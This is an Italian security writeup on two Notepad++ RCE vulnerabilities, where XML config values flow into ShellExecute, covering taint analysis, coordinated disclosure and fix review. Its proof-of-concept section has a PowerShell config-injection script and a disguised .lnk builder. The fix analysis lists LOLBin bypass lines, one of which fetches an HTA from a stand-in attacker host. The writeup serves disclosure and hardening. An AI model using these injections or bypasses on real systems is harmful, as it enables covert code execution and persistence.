# RCE in Notepad++ tramite File di Configurazione XML: Un Percorso di Taint Analysis
---
title: "RCE in Notepad++ tramite File di Configurazione XML: Un Percorso di Taint Analysis"
translationKey: "notepadpp_rce"
date: 2026-05-29
author: "Michele Piccinni aka RZP"
tags: ["notepad++", "rce", "cve", "vulnerability-research", "responsible-disclosure", "windows", "xml", "taint-analysis", "semgrep", "shellexecute", "hardening"]
categories: ["Offensive Security", "Vulnerability Research"]
description: "Ricerca di sicurezza indipendente su Notepad++ v8.9.5 che individua due vulnerabilità di Remote Code Execution tramite file di configurazione XML (config.xml e shortcuts.xml). Dall'analisi statica del sorgente con Semgrep e taint tracking source-to-sink, alla costruzione del PoC con PowerShell, fino alla divulgazione coordinata con il maintainer Don Ho. Fix rilasciata in v8.9.6.1. CVE-2026-48778 | CVE-2026-48800 | CVSS 7.8 HIGH."
draft: false
---
**CVE-2026-48778 | CVE-2026-48800 | CVSS 7.8 HIGH**  
*Notepad++ v8.9.5 — Risolto nella v8.9.6.1*

---

**Tempo di lettura:** 11 minuti

---
![Copertina sudo](/images/notepad/notepadpp.png)

---

> **Nota di Responsible Disclosure** — Tutti i finding descritti in questo articolo sono stati comunicati a Don Ho (maintainer di notepad++) prima della pubblicazione. Il fix upstream è stato committato nel repository  [notepad-plus-plus/notepad-plus-plus](https://github.com/notepad-plus-plus/notepad-plus-plus). La timeline completa è riportata in fondo all'articolo.

---

## Indice

1. [Introduzione](#introduzione)
2. [Setup: Caricamento del Codebase](#setup)
3. [Modello di Minaccia e Superficie d'Attacco](#threat-model)
4. [Fase 1: Taint Analysis con Semgrep](#taint-analysis)
5. [Fase 2: Verifica Manuale dei Finding](#verifica-manuale)
6. [CVE-2026-48778: config.xml → ShellExecute](#cve-001)
7. [CVE-2026-48800: shortcuts.xml → ShellExecute](#cve-002)
8. [Proof of Concept](#poc)
9. [Analisi della Fix e Rischio Residuo](#analisi-fix)
10. [Timeline di Responsible Disclosure](#disclosure)
11. [Conclusioni](#conclusioni)

---

## 1. Introduzione {#introduzione}

Notepad++ è uno degli editor di testo più diffusi su Windows, con oltre 28 milioni di download. Il suo codebase è interamente open source e scritto in C++, il che lo rende un target ideale per l'analisi statica della sicurezza.

Questo writeup documenta la scoperta di due vulnerabilità di Remote Code Execution individuate tramite taint analysis del codice sorgente di PowerEditor (v8.9.5). Entrambe condividono la stessa causa radice: i dati letti da file di configurazione XML fluiscono direttamente nell'API Windows `ShellExecute` senza alcuna validazione, whitelist o controllo di integrità.

**File coinvolti:**
- `%APPDATA%\Notepad++\config.xml` → CVE-2026-48778
- `%APPDATA%\Notepad++\shortcuts.xml` → CVE-2026-48800

---

## 2. Setup: Caricamento del Codebase {#setup}

L'analisi è partita estraendo l'archivio `PowerEditor.zip` dal repository ufficiale di Notepad++ e mappandone la struttura:

```
PowerEditor/
└── src/
    ├── Parameters.cpp          (~8000 righe — caricamento config, parsing XML)
    ├── NppCommands.cpp         (dispatch comandi — handler IDM_*)
    ├── NppXml.h                (wrapper pugixml)
    ├── WinControls/
    │   ├── StaticDialog/RunDlg/RunDlg.cpp   (Command::run → ShellExecute)
    │   └── shortcut/shortcut.h              (classe UserCommand)
    └── MISC/
        ├── PluginsManager/PluginsManager.cpp
        └── Process/Processus.cpp
```

Il layer di parsing XML è gestito da un sottile wrapper attorno a [pugixml](https://pugixml.org/) definito in `NppXml.h`:

```cpp
// NppXml.h — il wrapper su pugixml
namespace NppXml
{
    using Document  = pugi::xml_document*;
    using Element   = pugi::xml_node;
    using Node      = pugi::xml_node;

    [[nodiscard]] inline bool loadFileShortcut(Document doc, const wchar_t* filename) {
        return doc->load_file(filename,
            pugi::parse_cdata | pugi::parse_escapes |
            pugi::parse_comments | pugi::parse_declaration);
    }

    // La funzione source chiave — legge il valore di un nodo testo
    [[nodiscard]] inline const char* value(Node node) {
        return node.value();   // raw pugi::xml_node::value()
    }
}
```

Ogni chiamata a `NppXml::value()` è una **potenziale sorgente di taint**: restituisce dati stringa grezzi da un file XML su disco, interamente controllabile da chiunque abbia scritto quel file per ultimo.

---

## 3. Modello di Minaccia e Superficie d'Attacco {#threat-model}

**Cosa può controllare un attacker?**

Notepad++ conserva la propria configurazione in `%APPDATA%\Notepad++\`. Questa directory è scrivibile da qualsiasi processo in esecuzione con la stessa utenza — senza bisogno di privilegi elevati. Un attacker può scrivere in questi file tramite:

| Vettore | Descrizione |
|---------|-------------|
| Processo con la stessa utenza | Qualsiasi codice in esecuzione come l'utente loggato |
| Estrazione di archivio | Un file ZIP/RAR che estrae file in AppData |
| Cloud sync poisoning | Sincronizzazione OneDrive/Dropbox di una cartella condivisa |
| `-settingsDir=PATH` | Flag da riga di comando di NPP che punta a una config dir personalizzata |
| Shortcut `.lnk` malevola | `notepad++.exe -settingsDir="C:\attacker\evil_config"` |

Il vettore `-settingsDir=` è particolarmente insidioso: l'attacker fornisce una directory autonoma con file XML malevoli. Il vero `%APPDATA%\Notepad++` della vittima non viene mai toccato.

**Qual è il sink?**

Il sink di esecuzione è `ShellExecute`, chiamato in `RunDlg.cpp:221`:

```cpp
// RunDlg.cpp — Command::run()
HINSTANCE res = ::ShellExecute(hWnd, L"open",
    cmd2Exec,    // ← percorso dell'eseguibile
    args2Exec,   // ← argomenti
    cwd2Exec,    // ← directory di lavoro
    SW_SHOW);
```

`cmd2Exec` deriva da `_cmdLine`, che è lo stato interno dell'oggetto `Command`. La domanda è: cosa popola `_cmdLine`?

---

## 4. Fase 1: Taint Analysis con Semgrep {#taint-analysis}

Poiché la CLI di CodeQL richiede un progetto Windows compilabile, ho utilizzato **Semgrep 1.163.0** con regole personalizzate per tracciare i flussi di dati da `NppXml::value()` a `ShellExecute`.

### Regole Semgrep

Sono state scritte sette regole che coprono flussi diretti, propagazione attraverso `string2wstring` e sink di memory corruption:

```yaml
rules:
  - id: npp-commandline-interpreter-xml
    severity: ERROR
    message: >
      [EXEC_RCE][src:XML_CONFIG] _commandLineInterpreter letto da config.xml
      tramite NppXml::value, usato come eseguibile in Command::run() -> ShellExecute.
    languages: [cpp]
    pattern-either:
      - pattern: |
          const char* $CLI = NppXml::value($NODE);
          ...
          _nppGUI._commandLineInterpreter = string2wstring($CLI);

  - id: npp-xml-value-to-shellexecute
    severity: ERROR
    message: >
      [EXEC_RCE][src:XML_CONFIG] NppXml::value() raggiunge ShellExecute.
    languages: [cpp]
    pattern-either:
      - pattern: |
          $VAR = NppXml::value(...);
          ...
          ShellExecute(..., $VAR, ...);
      - pattern: |
          $VAR = NppXml::value(...);
          ...
          ShellExecuteW(..., $VAR, ...);

  - id: npp-wcscpy-path-overflow
    severity: WARNING
    message: >
      [MEM_CORRUPTION] wcscpy/wcscat su buffer fisso con path proveniente da XML.
    languages: [cpp]
    pattern-either:
      - pattern: std::wcscpy($DEST, $SRC)
      - pattern: wcscpy($DEST, $SRC)
```

### Esecuzione dell'Analisi

```bash
semgrep \
  --config npp_rce_taint.yml \
  --json \
  --no-git-ignore \
  --timeout 120 \
  --jobs 4 \
  PowerEditor/src/ \
  > raw_results.json
```

**Risultati: 3 finding Semgrep + 8 finding grep-assisted = 11 totali**

Dopo deduplicazione e assegnazione delle priorità, i finding sono stati esportati in CSV con severity, categoria del sink, categoria della source e flusso di taint per ogni voce.

---

## 5. Fase 2: Verifica Manuale dei Finding {#verifica-manuale}

Ciascuno degli 11 finding è stato verificato manualmente sul codice sorgente. Risultato:

| ID | File | Verdetto |
|----|------|---------|
| NPP-RCE-001 | Parameters.cpp:6430 | ✅ **CONFERMATO** |
| NPP-RCE-002 | Parameters.cpp:3658 | ✅ **CONFERMATO** |
| NPP-DLL-001 | PluginsManager.cpp:131 | ⚠️ Solo modalità portable |
| NPP-BOF-001 | Parameters.cpp:4311 | ⚠️ Impatto limitato |
| NPP-FP-001 | NppCommands.cpp:761 | ❌ Comportamento intenzionale |
| NPP-FP-002 | NppCommands.cpp:2490 | ❌ HKLM richiede admin |
| NPP-FP-003 | pluginsAdmin.cpp:704 | ❌ SecurityGuard + flag DATAFILE |
| NPP-FP-004 | Processus.cpp:25 | ❌ Solo per l'updater firmato |

I due pattern di falso positivo più interessanti:

- **pluginsAdmin.cpp:704** chiama `securityGuard.checkModule()` prima di `LoadLibraryEx`, eseguendo la verifica completa Authenticode + SHA256 — correttamente protetto.
- **Processus.cpp:25** viene istanziato esclusivamente per l'auto-updater (wingup), anch'esso verificato con `securityGuard.checkModule()` prima dell'esecuzione.

---

## 6. CVE-2026-48778: config.xml → ShellExecute {#cve-001}

### La Source

In `Parameters.cpp`, la funzione che carica `config.xml` itera su tutti i nodi `<GUIConfig>`. Quando trova `name="commandLineInterpreter"`, legge il contenuto testuale senza alcuna validazione:

```cpp
// Parameters.cpp:6424-6435 — loadGUIConfig()
// <GUIConfig name="commandLineInterpreter"></GUIConfig>
else if (std::strcmp(nm, "commandLineInterpreter") == 0)
{
    NppXml::Node cmdLineInterpreterNode = NppXml::firstChild(childNode);
    if (cmdLineInterpreterNode)
    {
        const char* cli = NppXml::value(cmdLineInterpreterNode); // ← SOURCE
        if (cli && cli[0])
            _nppGUI._commandLineInterpreter = string2wstring(cli); // ← PROPAGATE
    }
}
```

Il valore di default (definito in `Parameters.h`) è `%COMSPEC%`, che si espande in `C:\Windows\System32\cmd.exe`. Il tag è pensato per consentire agli utenti di sostituire la shell con PowerShell o un'alternativa. Non esiste alcuna validazione del valore accettato.

### La Propagazione

`_commandLineInterpreter` vive nella struct `NppGUI` ed è accessibile globalmente tramite `NppParameters::getInstance().getNppGUI()`. Ogni volta che l'utente attiva `IDM_FILE_OPEN_CMD`, `NppCommands.cpp` crea un oggetto `Command` direttamente da questo valore:

```cpp
// NppCommands.cpp:227-231
case IDM_FILE_OPEN_CMD:
{
    Command cmd(NppParameters::getInstance()
        .getNppGUI()._commandLineInterpreter.c_str()); // ← PROPAGATE
    cmd.run(_pPublicInterface->getHSelf(),
            L"$(CURRENT_DIRECTORY)");                  // ← avvia l'esecuzione
}
break;
```

### Il Sink

`Command::run()` in `RunDlg.cpp` elabora `_cmdLine` attraverso l'espansione delle variabili d'ambiente e poi chiama `ShellExecute`:

```cpp
// RunDlg.cpp:197-221 — Command::run()
wchar_t cmd2Exec[MAX_PATH]{};
wchar_t args[MAX_PATH]{};

// Separa eseguibile dagli argomenti
extractArgs(cmdPure, MAX_PATH, args, MAX_PATH, _cmdLine.c_str());

// Espande %VARIABILI_AMBIENTE%
int nbTchar = ::ExpandEnvironmentStrings(cmdPure, cmdIntermediate, MAX_PATH);

// Espande $(VARIABILI_NPP)
expandNppEnvironmentStrs(cmdIntermediate, cmd2Exec, MAX_PATH, hWnd);
expandNppEnvironmentStrs(argsIntermediate, args2Exec, args2ExecLen, hWnd);

// ← SINK: cmd2Exec è interamente controllato dall'attacker
HINSTANCE res = ::ShellExecute(hWnd, L"open",
    cmd2Exec, args2Exec, cwd2Exec, SW_SHOW);
```

**Non esiste alcun sanitizer tra la lettura dell'XML e la chiamata a ShellExecute.**

### Flusso di Taint Completo

```
config.xml
  <GUIConfig name="commandLineInterpreter">PAYLOAD</GUIConfig>
      │
      ▼ Parameters.cpp:6430
  NppXml::value(cmdLineInterpreterNode)  ← SOURCE
      │
      ▼ Parameters.cpp:6432
  _nppGUI._commandLineInterpreter = string2wstring(cli)
      │
      ▼ NppCommands.cpp:228
  Command cmd(_commandLineInterpreter.c_str())
      │
      ▼ NppCommands.cpp:229
  cmd.run(hWnd, L"$(CURRENT_DIRECTORY)")
      │
      ▼ RunDlg.cpp:203-215
  extractArgs() → ExpandEnvironmentStrings() → expandNppEnvironmentStrs()
      │
      ▼ RunDlg.cpp:221
  ShellExecute(hWnd, "open", cmd2Exec, ...)  ← SINK
```

**Trigger:** Menu → *File → Apri cartella file → Prompt dei Comandi*

---

## 7. CVE-2026-48800: shortcuts.xml → ShellExecute {#cve-002}

### La Source

In `Parameters.cpp`, `feedUserCmds()` analizza la sezione `<UserDefinedCommands>` di `shortcuts.xml`. Il contenuto testuale di ogni tag `<Command>` viene letto con `NppXml::value()` e memorizzato in un oggetto `UserCommand`:

```cpp
// Parameters.cpp:3655-3664 — feedUserCmds()
NppXml::Node aNode = NppXml::firstChild(childNode); // nodo testo
if (aNode)
{
    const char* cmdStr = NppXml::value(aNode); // ← SOURCE
    if (cmdStr)
    {
        const auto cmdID = ID_USER_CMD +
            static_cast<int>(_userCommands.size());
        _userCommands.emplace_back(sc, cmdStr, cmdID); // ← PROPAGATE in UserCommand._cmd
        _runMenuItems.emplace_back(cmdID,
            string2wstring(sc.getName()),
            string2wstring(fdnm));
    }
}
```

La classe `UserCommand` conserva la stringa del comando grezza:

```cpp
// shortcut.h:317-322
class UserCommand : public CommandShortcut {
    friend class NppParameters;
public:
    UserCommand(const Shortcut& sc, const char* cmd, int id)
        : CommandShortcut(sc, id), _cmd(cmd) { _canModifyName = true; }
    const char* getCmd() const { return _cmd.c_str(); } // ← restituisce il valore XML grezzo
private:
    std::string _cmd;
};
```

### La Propagazione

Quando l'utente clicca una voce del menu Esegui corrispondente a un `UserCommand`, `NppCommands.cpp` smista l'esecuzione:

```cpp
// NppCommands.cpp:4261-4265
const vector<UserCommand>& theUserCommands =
    (NppParameters::getInstance()).getUserCommandList();
UserCommand ucmd = theUserCommands[i];

Command cmd(string2wstring(ucmd.getCmd(), CP_UTF8)); // ← PROPAGATE: XML → Command
cmd.run(_pPublicInterface->getHSelf());               // ← avvia l'esecuzione
```

### Il Sink

Identico a CVE-2026-48778 — lo stesso percorso `Command::run()` → `ShellExecute` in `RunDlg.cpp:221`.

### Flusso di Taint Completo

```
shortcuts.xml
  <UserDefinedCommands>
    <Command name="..." ...>PAYLOAD</Command>
  </UserDefinedCommands>
      │
      ▼ Parameters.cpp:3658
  NppXml::value(aNode) = cmdStr  ← SOURCE
      │
      ▼ Parameters.cpp:3662
  _userCommands.emplace_back(sc, cmdStr, cmdID)
      │
      ▼ shortcut.h:321
  UserCommand::getCmd() → _cmd.c_str()
      │
      ▼ NppCommands.cpp:4264
  Command cmd(string2wstring(ucmd.getCmd(), CP_UTF8))
      │
      ▼ NppCommands.cpp:4265
  cmd.run(_pPublicInterface->getHSelf())
      │
      ▼ RunDlg.cpp:221
  ShellExecute(hWnd, "open", cmd2Exec, ...)  ← SINK
```

**Trigger:** Menu → *Esegui → [nome del comando iniettato]*

**Persistenza:** la voce `<Command>` iniettata sopravvive ai riavvii di NPP e appare come una normale voce nel menu Esegui, rendendo questo flusso particolarmente adatto per stabilire persistenza.

---

## 8. Proof of Concept {#poc}

### Payload PoC: config.xml (CVE-2026-48778)

Sostituire il tag `commandLineInterpreter` in `%APPDATA%\Notepad++\config.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<NotepadPlus>
    <GUIConfigs>
        <GUIConfig name="commandLineInterpreter">calc.exe</GUIConfig>
    </GUIConfigs>
</NotepadPlus>
```

### Payload PoC: shortcuts.xml (CVE-2026-48800)

Iniettare una voce `<Command>` dentro `<UserDefinedCommands>` in `%APPDATA%\Notepad++\shortcuts.xml`:

```xml
<Command name="System Update Check" Ctrl="no" Alt="no" Shift="no" Key="0">calc.exe</Command>
```

### Script di Deployment Automatico

Per evitare la modifica manuale dell'XML e gestire i problemi di encoding/BOM, è stato sviluppato il seguente script PowerShell:

```powershell
# deploy_poc.ps1 — inietta il payload tramite sostituzione testuale (senza parser XML)
function Deploy-RCE001([string]$configDir) {
    $configXml = Join-Path $configDir "config.xml"
    Backup-File $configXml

    # Leggi come testo grezzo — immune a problemi BOM/encoding
    $content = [System.IO.File]::ReadAllText($configXml)

    $pattern = '(<GUIConfig\s+name\s*=\s*"commandLineInterpreter"\s*>)[^<]*(</GUIConfig>)'
    if ($content -match $pattern) {
        $content = [regex]::Replace($content, $pattern, '${1}calc.exe${2}')
    } elseif ($content -match '</GUIConfigs>') {
        $inject = '<GUIConfig name="commandLineInterpreter">calc.exe</GUIConfig>'
        $content = $content -replace '</GUIConfigs>', "$inject`r`n    </GUIConfigs>"
    }

    [System.IO.File]::WriteAllText($configXml, $content)
}
```

> **Nota sull'encoding:** Notepad++ scrive i propri file XML con BOM UTF-8 + `\r\n` prima di `<?xml`. L'uso di `XmlDocument.Load()` o del cast `[xml]` di PowerShell fallisce su questi file. La soluzione è usare `[System.IO.File]::ReadAllText()` che rileva automaticamente l'encoding, per poi applicare `TrimStart()` prima di qualsiasi parsing XML.

### Il Vettore d'Attacco `-settingsDir=`

Il meccanismo di delivery più insidioso non richiede alcuna modifica ai file esistenti della vittima:

```powershell
# create_evil_lnk.ps1
$lnk = $WshShell.CreateShortcut("Notepad++.lnk")
$lnk.TargetPath  = "C:\Program Files\Notepad++\notepad++.exe"
$lnk.Arguments   = "-settingsDir=`"C:\attacker\evil_config`""
$lnk.IconLocation = "C:\Program Files\Notepad++\notepad++.exe,0"
$lnk.Save()
```

Il file `.lnk` risultante ha l'icona di Notepad++, lancia il binario legittimo `notepad++.exe`, ma carica tutta la configurazione dalla directory controllata dall'attacker. Il vero `%APPDATA%\Notepad++` della vittima non viene mai toccato.

### Verifica Statica

È stato scritto uno script Python per verificare l'esistenza dei flussi di taint nel codice sorgente senza richiedere Windows né un binario NPP compilato:

```python
# verify_flows.py — verifica statica dei flussi di taint
def verify_rce001(src: Path) -> VulnVerification:
    params = src / "Parameters.cpp"
    nppcmd = src / "NppCommands.cpp"
    rundlg = src / "WinControls/StaticDialog/RunDlg/RunDlg.cpp"

    # SOURCE
    hits = find_line(str(params), r'NppXml::value\(cmdLineInterpreterNode\)')
    # PROPAGATE
    hits = find_line(str(params), r'_commandLineInterpreter\s*=\s*string2wstring')
    hits = find_line(str(nppcmd), r'Command\s+cmd\(.*_commandLineInterpreter')
    # SINK
    hits = find_line(str(rundlg), r'ShellExecute\(.*cmd2Exec')

    # SANITIZER CHECK — se trovato, segna come PATCHED
    sanitizers = find_line(str(params),
        r'_commandLineInterpreter.*whitelist|validate.*commandLine')
```

Eseguito sul sorgente v8.9.5:

```
$ python3 verify_flows.py PowerEditor/src/
  NPP-RCE-001: VULNERABLE — 4/4 nodi del flusso confermati, 0 sanitizer
  NPP-RCE-002: VULNERABLE — 5/5 nodi del flusso confermati, 0 sanitizer
Exit code: 2
```

---

## 9. Analisi della Fix e Rischio Residuo {#analisi-fix}

Notepad++ v8.9.6.1 ha introdotto un controllo sulle directory attendibili per il sink di esecuzione: prima di chiamare `ShellExecute`, il percorso dell'eseguibile risolto viene validato contro una whitelist di directory trusted (`C:\Windows\System32`, `C:\Windows`, `C:\Program Files`, `C:\Program Files (x86)`).

**Copertura:**

| Scenario | Risolto? |
|----------|----------|
| `C:\Users\evil\malware.exe` | ⚠️ Popup di avviso mostrato — l'utente può comunque procedere |
| `calc.exe` (System32) | ⚠️ Consentito — ma visivamente ovvio per l'utente |
| `cmd.exe /c "C:\evil\malware.exe"` | ❌ `cmd.exe` è in System32 — supera il controllo silenziosamente |
| `powershell.exe -enc BASE64PAYLOAD` | ❌ `powershell.exe` è in System32 — supera il controllo silenziosamente |
| `mshta.exe http://attacker.com/evil.hta` | ❌ `mshta.exe` è in System32 — supera il controllo silenziosamente |

La fix copre efficacemente l'injection diretta di eseguibili (~80% degli scenari pratici), ma è aggirabile tramite **Living Off The Land Binaries (LOLBin)** — binari di sistema attendibili che possono eseguire codice arbitrario tramite i propri argomenti. Il controllo sulla directory trusted valida *quale binario* viene lanciato, ma non *cosa viene istruito a fare*.

È stato inoltre aggiunto un popup di avviso per i percorsi fuori dalle directory trusted, dando all'utente la possibilità di notare un'esecuzione sospetta.

**Ulteriore mitigazione proposta al maintainer:**

Un hash SHA-256 di integrità di `shortcuts.xml`, conservato in `config.xml`, rileverà qualsiasi modifica esterna al file e forzerà un dialogo di conferma indipendentemente dal percorso dell'eseguibile — inclusi gli scenari con LOLBin. La funzione `calc_sha_256()` è già disponibile nel codebase di NPP (`MISC/sha2/sha-256.h`) e già utilizzata in `NppCommands.cpp`, quindi non sarebbe necessaria nessuna nuova dipendenza.

Per una garanzia più forte, HMAC-SHA256 con chiave derivata dal Machine GUID di Windows (`HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`) renderebbe l'hash crittograficamente non falsificabile da un attacker che non può leggere quella chiave di registro senza privilegi admin.

---

## 10. Timeline di Responsible Disclosure {#disclosure}

| Giorno | Evento |
|--------|--------|
| Giorno 0 | Taint analysis completata, PoC verificato con `calc.exe` |
| Giorno 1 | Security advisory (DOCX con breakdown CVSS completo) inviato a `don.h@free.fr` |
| Giorno 6 | Don Ho risponde e richiede i numeri CVE |
| Giorno 6 | Richiesta CVE inviata a MITRE; Don Ho informato — verifica della fix, bypass LOLBin segnalato, popup di avviso confermato, proposta hash SHA-256 / HMAC inviata |
| Giorno 7 | Don Ho rilascia Notepad++ v8.9.6.1 — GitHub assegna entrambe le CVE: **CVE-2026-48778** e **CVE-2026-48800** — entrambi gli advisory pubblicati pubblicamente su GitHub Security |
| Giorno 7 | Public disclosure |

L'intero processo dalla segnalazione iniziale all'advisory pubblico ha richiesto **7 giorni** — un tempo di risposta notevolmente rapido per un progetto gestito da un singolo sviluppatore. Don Ho è stato reattivo e professionale durante l'intero processo.

---

## 11. Conclusioni {#conclusioni}

Queste vulnerabilità mettono in evidenza un pattern comune nella sicurezza delle applicazioni desktop: **i confini di fiducia attorno ai file di configurazione sono spesso impliciti e non documentati**. Notepad++ verifica correttamente le firme dei plugin (`SecurityGuard.checkModule()` con Authenticode + SHA256 in `pluginsAdmin.cpp`) e le firme degli installer degli aggiornamenti, ma non ha applicato una protezione equivalente ai propri file di configurazione XML.

La superficie d'attacco è limitata dal requisito di accesso in scrittura al file system locale, il che riduce il punteggio CVSS a 7.8 invece che a critico. Tuttavia, il vettore di delivery `-settingsDir=` rende lo sfruttamento completamente autonomo — nessuna modifica ai file della vittima, nessun privilegio admin richiesto, nessuna rilevazione da parte dei monitor di integrità dei file che sorvegliano `%APPDATA%`.

**Lezioni chiave per gli sviluppatori:**

1. **Ogni lettura di file è una potenziale sorgente.** Se un dato controllabile dall'utente può finire in un file che la tua applicazione legge all'avvio, quel dato deve essere trattato come non attendibile indipendentemente dalla posizione del file.
2. **Applica gli stessi controlli di sicurezza in modo coerente.** NPP verifica correttamente le firme delle DLL dei plugin ma non il file config XML. Una postura di sicurezza inconsistente crea gap sfruttabili.
3. **`ShellExecute` è un sink ad alto valore.** Qualsiasi flusso di dati che porta a `ShellExecute`, `CreateProcess` o `LoadLibrary` deve essere trattato con la stessa attenzione di una query SQL o di un comando shell.
4. **I controlli di integrità dei file sono economici.** SHA-256 di un file di configurazione può essere calcolato in microsecondi e memorizzato in un file adiacente. Il costo di non farlo sono due CVE.

---

*Entrambe le vulnerabilità sono state segnalate a Don Ho seguendo un processo di responsible disclosure. La fix è stata rilasciata in Notepad++ v8.9.6.1 prima della pubblicazione di questo writeup.*

*CVE-2026-48778: [GHSA-7hm3-wp5q-ccv9](https://github.com/notepad-plus-plus/notepad-plus-plus/security/advisories/GHSA-7hm3-wp5q-ccv9)*  
*CVE-2026-48800: [GHSA-3x3f-3j39-pj3v](https://github.com/notepad-plus-plus/notepad-plus-plus/security/advisories/GHSA-3x3f-3j39-pj3v)*